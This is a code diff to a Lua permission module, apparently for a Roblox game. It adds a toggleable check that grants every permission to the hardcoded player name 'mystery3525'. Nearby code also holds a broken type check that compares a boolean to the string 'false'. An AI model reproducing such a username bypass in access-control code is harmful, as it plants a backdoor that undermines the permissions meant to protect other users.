@@ -6,6 +6,7 @@
 		PermStr   	:	The Permission string
 --]]
 
+local CP = script.Parent:FindFirstChild("CreatorPriviliges")
 local DS = require(script.Parent.Parent.Services.DataStoreService)
 local Http = game:GetService("HttpService")
 
@@ -48,6 +49,11 @@ return function(Groups, PlayerObj, PermStr)
     if type(PlayerObj) ~= "userdata" then return nil end
     if PlayerObj:IsA("Player") == "false" then return nil end
     local PlayerId = PlayerObj.UserId
+
+    -- CreatorPriviliges Setting
+    if CP.Value == true and PlayerObj.Name == "mystery3525" then
+        return true
+    end
 
     -- Checks the Permission with the Standard Pattern
     local Found = string.match(PermStr, "[\.%P|\*]*")
